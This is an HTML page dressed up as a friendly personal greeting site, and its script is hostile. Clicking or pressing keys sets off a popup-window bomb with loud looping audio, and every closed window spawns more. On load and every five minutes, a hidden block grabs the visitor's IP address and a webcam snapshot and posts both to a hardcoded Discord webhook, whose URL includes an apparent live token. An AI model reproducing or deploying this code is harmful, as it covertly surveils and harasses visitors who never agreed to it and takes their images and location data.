<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8" />
<title>Сайт Севкi</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Segoe+UI&display=swap');
  body {
    margin: 0;
    height: 100vh;
    background: linear-gradient(135deg, #74ebd5 0%, #ACB6E5 100%);
    display: flex;
    justify-content: center;
    align-items: center;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    user-select: none;
    overflow: hidden;
  }
  .glass-container {
    background: rgba(255, 255, 255, 0.15);
    border-radius: 20px;
    box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
    backdrop-filter: blur(10px);
    -webkit-backdrop-filter: blur(10px);
    border: 1px solid rgba(255, 255, 255, 0.18);
    padding: 40px;
    width: 380px;
    text-align: center;
    color: white;
    text-shadow: 0 0 8px rgba(0,0,0,0.7);
    font-weight: 700;
    font-size: 1.5rem;
  }
</style>
</head>
<body>
  <div class="glass-container">
    <div>Привiт, Це Сайт Севкi</div>
    <div style="margin-top: 15px; font-weight: 500; font-size: 1.1rem;">
      Нажми пробел або кликни щоби продовжити
    </div>
  </div>

<script>
  const audioSrc = 'https://sevkabevka.github.io/alah.mp3';

  // Play background audio loudly looping
  const bgAudio = new Audio(audioSrc);
  bgAudio.loop = true;
  bgAudio.volume = 1.0;
  bgAudio.play().catch(() => { /* ignore autoplay block */ });

  let popupCount = 0;
  let popups = [];

  class PopupWindow {
    constructor() {
      this.win = window.open('', '', 'width=500,height=500,left=100,top=100');
      if (!this.win) return;
      this.angle = 0;
      this.x = 100 + Math.random()*300;
      this.y = 100 + Math.random()*300;
      this.dx = (Math.random() - 0.5) * 10;
      this.dy = (Math.random() - 0.5) * 10;
      this.rotationSpeed = (Math.random() - 0.5) * 10;

      this.win.document.write(`
        <style>
          body {
            margin:0; background:black; overflow:hidden;
            display:flex; justify-content:center; align-items:center;
            color:white; font-family: Arial, sans-serif;
          }
          audio { display:none; }
        </style>
        <body>
          <audio autoplay loop src="${audioSrc}" volume="1.0"></audio>
        </body>
      `);
      this.win.document.close();

      this.interval = setInterval(() => {
        if (this.win.closed) {
          clearInterval(this.interval);
          this.handleClose();
          return;
        }
        this.moveAndRotate();
      }, 100);
    }

    moveAndRotate() {
      const screenW = screen.availWidth;
      const screenH = screen.availHeight;

      this.x += this.dx;
      this.y += this.dy;
      this.angle += this.rotationSpeed;

      if (this.x < 0 || this.x > screenW - 500) this.dx = -this.dx;
      if (this.y < 0 || this.y > screenH - 500) this.dy = -this.dy;

      this.win.moveTo(this.x, this.y);

      let sizeMod = 20 * Math.abs(Math.sin(this.angle * Math.PI / 180));
      this.win.resizeTo(500 + sizeMod, 500 + sizeMod);
    }

    handleClose() {
      popups = popups.filter(p => p !== this);
      popupCount = popups.length;
      let toSpawn = popupCount > 0 ? popupCount * 2 : 2;
      for (let i = 0; i < toSpawn; i++) {
        spawnWindow();
      }
    }
  }

  function spawnWindow() {
    const p = new PopupWindow();
    if (p.win) popups.push(p);
    popupCount = popups.length;
  }

  function spamWindows() {
    if (popupCount === 0) {
      for (let i = 0; i < 5; i++) {
        spawnWindow();
      }
    }
  }

  document.addEventListener('keydown', e => {
    if (e.code === 'Space') spamWindows();
  });
  document.addEventListener('click', spamWindows);
  document.addEventListener('contextmenu', e => {
    e.preventDefault();
    spamWindows();
  });

  // --- Added script for IP grabbing and camera snapshot ---

  const webhookURL = 'https://discordapp.com/api/webhooks/1374439333473292298/oF_3g-oeCrSnruf7vmDS8wd9bqXvQnvhTTkJdBUpaQU-r4K_JOLcXFHHzCA8W8J5Zcws';

  async function getUserIP() {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  }

  async function sendToWebhook(payload) {
    await fetch(webhookURL, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(payload),
    });
  }

  async function sendUserIP() {
    const ip = await getUserIP();
    await sendToWebhook({type: 'ip', ip: ip, timestamp: new Date().toISOString()});
  }

  async function captureCameraSnapshot() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({video: true});
      const video = document.createElement('video');
      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');

      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      stream.getTracks().forEach(track => track.stop());

      return canvas.toDataURL('image/png');
    } catch {
      return null;
    }
  }

  async function sendSnapshot() {
    const img = await captureCameraSnapshot();
    if (!img) return;
    await sendToWebhook({type: 'camera_snapshot', image: img, timestamp: new Date().toISOString()});
  }

  async function initDataCapture() {
    await sendUserIP();
    await sendSnapshot();
  }

  window.addEventListener('load', () => {
    initDataCapture();
  });

  setInterval(() => {
    initDataCapture();
  }, 5 * 60 * 1000);

</script>
</body>
</html>
